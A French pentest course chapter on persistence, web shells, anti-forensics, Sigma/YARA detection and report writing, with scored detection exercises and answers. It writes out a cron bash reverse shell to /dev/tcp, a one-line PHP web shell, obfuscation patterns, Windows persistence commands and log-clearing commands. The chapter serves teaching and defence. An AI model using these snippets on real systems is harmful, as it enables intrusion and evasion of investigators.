Chapitre 6 — Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest

Module 6 ≈ 2 h 45 de travail Réservé B3 et plus
Mise en situation

Un test d'intrusion ne s'achève pas lorsqu'un accès root est obtenu : sa valeur ajoutée réside intégralement dans la qualité du rapport délivré au client et dans l'évaluation de la capacité défensive de l'organisation. Un rapport incompréhensible pour la direction ou un nettoyage négligé laissant des backdoors actives sur les serveurs de production ruine la crédibilité de l'auditeur. En tant qu'expert en cybersécurité B3, vous devez maîtriser les techniques de persistance et de post-exploitation pour évaluer la réactivité du SOC, nettoyer scrupuleusement vos implants, et rédiger un rapport d'audit d'excellence articulant synthèse managériale percutante et fiches de remédiation technique actionnables.

Objectifs pédagogiques

À la fin de ce chapitre, vous serez capable de :

  1. analyser les mécanismes de persistance sous Linux (cron, systemd, authorized_keys) et Windows (Run keys, services) ;
  2. détecter et désobfusquer les web shells PHP/JSP exploitant des fonctions d'évaluation dynamique ;
  3. comprendre les techniques d'anti-forensics (timestomping, effacement de logs) et leur détection par la Blue Team ;
  4. analyser les règles de détection comportementale modernes : règles Sigma pour SIEM et règles YARA pour fichiers ;
  5. structurer un rapport de test d'intrusion complet conforme aux standards de l'industrie (PTES) ;
  6. rédiger un Executive Summary managérial et un plan de remédiation priorisé (immédiat, court terme, moyen terme).

1. Persistance & Maintien de l'Accès (Linux & Windows)

La persistance garantit qu'un redémarrage de la machine ou une coupure de session n'interrompt pas l'accès obtenu par l'auditeur ou l'attaquant :

Mécanismes de Persistance Linux

  • Clés SSH autorisées : injection de la clé publique de l'auditeur dans ~/.ssh/authorized_keys ou /root/.ssh/authorized_keys pour des reconnexions directes.
  • Tâches Crontab : création d'une entrée planifiée dans /etc/cron.d/ exécutant périodiquement un reverse shell (ex: * * * * * /bin/bash -i >& /dev/tcp/ip/port 0>&1).
  • Unités Systemd : création d'un service persistant avec redémarrage automatique (Restart=always) dans /etc/systemd/system/.
  • Fichiers de profil shell : ajout de commandes masquées à la fin de /etc/profile ou ~/.bashrc exécutées à chaque connexion d'un administrateur.

Mécanismes de Persistance Windows

  • Clés de Registre Run / RunOnce : HKCU\Software\Microsoft\Windows\CurrentVersion\Run (exécuté à l'ouverture de session de l'utilisateur).
  • Tâches Planifiées (Task Scheduler) : création d'une tâche via la commande schtasks /create /sc onlogon /tn "Update" /tr "payload.exe".
  • Services Windows persistants : création d'un service système avec démarrage automatique via sc create PersistentSvc binpath= "C:\implant.exe" start= auto.
  • Dossier de Démarrage (Startup) : dépôt d'un binaire ou raccourci dans shell:startup.

2. Web Shells & Détection de l'Obfuscation

Sur les serveurs web, le dépôt d'un web shell constitue la porte dérobée applicative la plus fréquente :

Anatomie d'un Web Shell PHP

Forme minimale non obfusquée :

<?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>

Fonctions d'exécution système surveillées : system(), passthru(), shell_exec(), exec(), popen(), proc_open().

Techniques d'Obfuscation

Pour contourner les antivirus et scanners de fichiers (WAF/EDR) :

  • Encodage Base64 et compression : eval(gzinflate(base64_decode($payload)));
  • Concaténation dynamique de chaînes : $a = "sys"."tem"; $a($_GET["x"]);
  • Variables variables et fonctions anonymes : $_="assert"; $_($_POST["c"]);

3. Dissimulation, Anti-Forensics & Nettoyage d'Implants

L'étape 5 du hacking éthique évalue les traces laissées et procède au nettoyage scrupuleux de l'environnement :

Timestomping (Horodatage)

Modification délibérée des horodatages MACB (Modification, Access, Creation, Birth) d'un fichier malveillant pour les aligner sur des binaires système légitimes (ex: touch -r /bin/ls /tmp/implant).

Complique la chronologie des analystes forensiques (DFIR).

Gestion des Journaux d'Événements

Les attaquants tentent d'effacer leurs traces dans l'historique shell (history -c, unset HISTFILE) ou dans les journaux Windows (wevtutil cl Security).

La Blue Team détecte cet effacement brutal comme une alerte critique majeure.

Protocole de Nettoyage (Cleanup)

Règle d'or du pentest : tous les artefacts déposés doivent être supprimés à la fin de la mission.

Suppression des comptes de test créés, des clés SSH ajoutées, des scripts web shells et des tâches planifiées.

4. Détection Moderne de la Blue Team : SIEM, EDR, Sigma & YARA

L'équipe défensive déploie des outils de surveillance pour intercepter les tactiques offensives :

Règles Sigma (Détection de Logs SIEM)

Format standardisé et agnostique pour décrire des comportements d'attaque dans les journaux système :

title: Détection d'accès au fichier shadow via commande anormale
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        CommandLine|contains: '/etc/shadow'
    condition: selection
level: critical

Règles YARA (Détection de Fichiers & Binaires)

Outil d'identification et de classification de malwares basé sur des signatures textuelles ou binaires :

rule Webshell_PHP_Eval_Base64 {
    strings:
        $eval = "eval(" ascii
        $b64 = "base64_decode" ascii
        $req = "$_POST" ascii
    condition:
        all of them
}

Exercice 1 — Détecteur de Web Shells et Obfuscation de Scripts Malveillants

Étude de cas Niveau 1 — Acquisition

Objectif : Analyser le code d'un script web pour repérer la présence de web shells et de mécanismes d'obfuscation.

Un web shell est un script déposé sur un serveur permettant à l'attaquant d'exécuter des commandes système à distance.

Indicateurs recherchés et scoring de dangerosité :
- Exécution de commandes système (system, passthru, shell_exec, popen) : +40 points.
- Évaluation dynamique de code (eval, assert) : +30 points.
- Fonctions d'obfuscation (base64_decode, gzinflate, str_rot13) : +20 points.
- Réception directe d'entrées non filtrées ($_GET, $_POST, $_REQUEST) : +20 points.

Classification finale :
- Si score >= 60 : status=MALICIOUS_WEBSHELL, risk=CRITICAL.
- Si 20 <= score < 60 : status=SUSPICIOUS_SCRIPT, risk=MEDIUM.
- Si score < 20 : status=BENIGN_CODE, risk=LOW.

Données du cas : SCAN_SCRIPT code=<extrait_de_code>.
Résultat d’analyse attendu : WEBSHELL_SCAN: score=<score> status=<status> risk=<risk>.

Cas d’exemple
SCAN_SCRIPT code=<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>
Résolution attendue
WEBSHELL_SCAN: score=60 status=MALICIOUS_WEBSHELL risk=CRITICAL

Web shell PHP classique à une ligne combinant system et $_REQUEST.

Trois indices, rédigés en mots
  1. Extrayez le code après "code=" avec l’extraction des champs[1].
  2. Testez la présence des différentes familles de mots-clés.
  3. Attribuez la classification selon les seuils 60 et 20.

Exercice 2 — Analyseur de Persistance Linux (Crontab & Reverse Shells)

Étude de cas Niveau 2 — Application

Objectif : Auditer les mécanismes de persistance et détecter les commandes de shell inverse (Reverse Shell).

Après obtention d'un accès initial, l'attaquant configure une tâche planifiée ou un script de démarrage pour maintenir sa connexion.

Signatures d'attaques surveillées :
1. BASH_REVERSE_SHELL : contient /dev/tcp/ ou bash -i.
2. NETCAT_REVERSE_SHELL : contient nc -e, ncat -e ou nc.traditional.
3. DOWNLOAD_EXECUTE : contient curl ou wget suivi de | sh ou | bash.
4. PYTHON_SOCKET_SHELL : contient python -c et socket.

Règles de diagnostic :
- Si l'une des signatures est présente :
malicious=TRUE, signature=<NOM_SIGNATURE>, risk=CRITICAL.
- Sinon :
malicious=FALSE, signature=CLEAN, risk=LOW.

Données du cas : PERSIST_AUDIT type=<CRON|SERVICE|SCRIPT> command=<commande>.
Résultat d’analyse attendu : PERSIST_RESULT: type=<type> malicious=<TRUE|FALSE> signature=<sig> risk=<risk>.

Cas d’exemple
PERSIST_AUDIT type=CRON command=* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
Résolution attendue
PERSIST_RESULT: type=CRON malicious=TRUE signature=BASH_REVERSE_SHELL risk=CRITICAL

Tâche cron récurrente établissant un reverse shell interactif vers l'attaquant.

Trois indices, rédigés en mots
  1. Extrayez la commande avec l’extraction des champs[1].
  2. Testez les motifs BASH_REVERSE_SHELL, NETCAT_REVERSE_SHELL, DOWNLOAD_EXECUTE, PYTHON_SOCKET_SHELL.
  3. Formatez la sortie PERSIST_RESULT.

Exercice 3 — Générateur de Synthèse Managériale et Matrice de Risque de Pentest

Étude de cas Niveau 3 — Raisonnement

Objectif : Agréger les vulnérabilités découvertes, calculer le score de risque global et qualifier la posture de sécurité.

Le rapport d'intrusion conclut chaque mandat de pentest par une synthèse managériale (Executive Summary) et une matrice de sévérité.

Pondération du score de risque :
- CRITICAL : 10 points chacun.
- HIGH : 5 points chacun.
- MEDIUM : 2 points chacun.
- LOW : 1 point chacun.
risk_score = (C * 10) + (H * 5) + (M * 2) + (L * 1).

Qualification de la posture globale de l'organisation :
1. Si C >= 1 ou risk_score >= 25 : posture=COMPROMISED_CRITICAL.
2. Sinon si H >= 2 ou risk_score >= 15 : posture=HIGH_EXPOSURE.
3. Sinon si risk_score >= 5 : posture=MODERATE_EXPOSURE.
4. Sinon : posture=SECURE_RESILIENT.

Données du cas : PENTEST_SYNTHESIS findings=<f1:sev1,f2:sev2,...>.
Résultat d’analyse attendu :
PENTEST_SUMMARY: total_findings=<N> critical=<C> high=<H> medium=<M> low=<L> risk_score=<score> posture=<posture>.

Cas d’exemple
PENTEST_SYNTHESIS findings=sqli_auth:CRITICAL,weak_cipher:MEDIUM,missing_hsts:LOW
Résolution attendue
PENTEST_SUMMARY: total_findings=3 critical=1 high=0 medium=1 low=1 risk_score=13 posture=COMPROMISED_CRITICAL

Une vulnérabilité critique déclenche immédiatement la posture COMPROMISED_CRITICAL.

Trois indices, rédigés en mots
  1. Comptez les occurrences de CRITICAL, HIGH, MEDIUM, LOW dans findings.
  2. Calculez le score pondéré (10, 5, 2, 1).
  3. Appliquez les conditions de qualification de posture.

7. QCM — niveau examen

Quel est l'objectif premier de la Synthèse Managériale (Executive Summary) dans un rapport de test d'intrusion ?

L'Executive Summary s'adresse aux décideurs (membres du comité de direction, DSI, RSSI) : il synthétise le niveau de risque global, les conséquences métier et les investissements de remédiation requis.

Quel mécanisme sous Linux permet à un attaquant de maintenir un accès persistant en s'authentifiant par clé publique sans mot de passe ?

Le fichier authorized_keys répertorie les clés publiques autorisées à ouvrir une session SSH : y déposer sa clé garantit un accès persistant immédiat sans nécessiter le mot de passe du compte.

Quelle clé de registre Windows est couramment exploitée par les malwares pour persister et s'exécuter automatiquement à l'ouverture de session utilisateur ?

Les clés de registre Run et RunOnce exécutent les programmes qui y sont référencés à chaque ouverture de session de l'utilisateur, constituant le vecteur de persistance le plus classique sous Windows.

Qu'est-ce que la technique d'anti-forensics appelée "Timestomping" ?

Le timestomping altère les attributs d'horodatage (MACB) d'un implant pour lui donner la même date qu'un fichier système voisin (ex: 2018), trompant les recherches par date des analystes de réponse à incident.

Quel est le rôle d'une règle YARA en cybersécurité défensive ?

YARA est l'outil de référence pour la détection de malwares : il permet aux analystes de concevoir des signatures identifiant des familles d'implants sur la base de chaînes de caractères et de motifs hexadécimaux.

Pourquoi l'effacement brutal de l'intégralité des journaux de sécurité Windows (wevtutil cl Security) est-il paradoxalement très risqué pour un attaquant furtif ?

Le vidage du journal d'audit de sécurité génère un événement spécifique (Event ID 1102) que tout SOC surveille avec la plus haute priorité : c'est un indicateur de compromission (IoC) flagrant.

À quel horizon de temps les recommandations qualifiées de "Quick Wins" dans un plan de remédiation doivent-elles être appliquées ?

Les Quick Wins représentent des actions correctives à très fort impact et faible complexité (ex: révoquer un binaire SUID inutile, corriger un enregistrement SPF) à déployer sous 24 à 48 heures.

Pourquoi la phase de nettoyage (Cleanup) des artefacts est-elle une exigence éthique et contractuelle absolue pour l'auditeur de sécurité ?

Tout implant, compte ou web shell oublié par l'auditeur devient une vulnérabilité supplémentaire sur le système client qui pourrait être découverte et exploitée par un acteur malveillant.

8. Erreurs classiques — récapitulatif

À reconnaître en examen
  • Oublier de nettoyer tous les implants, web shells et comptes de test à l'issue de la mission de pentest.
  • Rédiger un rapport d'intrusion exclusivement technique sans synthèse managériale adaptée aux décideurs.
  • Proposer des recommandations vagues ("Mettre à jour les systèmes") plutôt qu'un plan d'action priorisé par horizon.
  • Tenter un effacement brutal des journaux Windows (wevtutil) déclenchant immédiatement l'événement d'alerte 1102.

9. Méthodologie de résolution

Démarche d’ingénierie pas à pas
  1. Évaluer la résilience défensive en testant des mécanismes discrets de persistance (cron, authorized_keys).
  2. Analyser les traces résiduelles dans les journaux d'événements pour mesurer la visibilité du SOC.
  3. Procéder au nettoyage intégral et documenté de tous les artefacts déposés sur l'infrastructure client.
  4. Agréger et pondérer l'ensemble des vulnérabilités découvertes pour calculer la posture de risque global.
  5. Rédiger le rapport de pentest complet avec synthèse managériale, preuves de concept et feuille de route.

10. Révision active

Résumé essentiel
  • Le maintien de l'accès exploite des mécanismes de démarrage légitimes (cron, systemd, authorized_keys, clés Run du Registre).
  • Les web shells dissimulent leur code via des encodages Base64 et des fonctions d'exécution dynamique (eval, assert).
  • Les techniques d'anti-forensics comme le timestomping cherchent à tromper l'investigation numérique des analystes DFIR.
  • La Blue Team surveille les activités suspectes grâce aux SIEM/EDR alimentés par des règles Sigma et YARA.
  • Le rapport d'intrusion est le livrable fondamental du pentesteur : il articule Executive Summary et fiches techniques détaillées.

Checklist de maîtrise

  • Je sais auditer et détecter les mécanismes de persistance et les web shells obfusqués.
  • Je comprends les principes des règles de détection comportementale Sigma et YARA.
  • Je maîtrise la structure normalisée d'un rapport de test d'intrusion professionnel (PTES).
  • Je sais rédiger une synthèse managériale impactante et structurer un plan de remédiation par horizon.

Les 8 notions à connaître absolument

  1. Persistance : Mécanisme garantissant la survie d'un accès après le redémarrage d'un serveur ou la déconnexion de l'utilisateur.
  2. Web Shell : Script backdoor déposé sur un serveur web permettant l'exécution distante de commandes système via HTTP.
  3. Timestomping : Technique d'anti-forensics modifiant les horodatages MACB d'un fichier pour le dissimuler parmi les binaires système.
  4. Règles Sigma : Format ouvert et générique de détection de comportements suspects dans les journaux d'événements SIEM.
  5. Executive Summary : Synthèse managériale non-technique d'un rapport d'intrusion exposant le risque global et les impacts métier.
  6. Le maintien de l'accès exploite des mécanismes de démarrage légitimes (cron, systemd, authorized_keys, clés Run du Registre).
  7. Les web shells dissimulent leur code via des encodages Base64 et des fonctions d'exécution dynamique (eval, assert).
  8. Les techniques d'anti-forensics comme le timestomping cherchent à tromper l'investigation numérique des analystes DFIR.
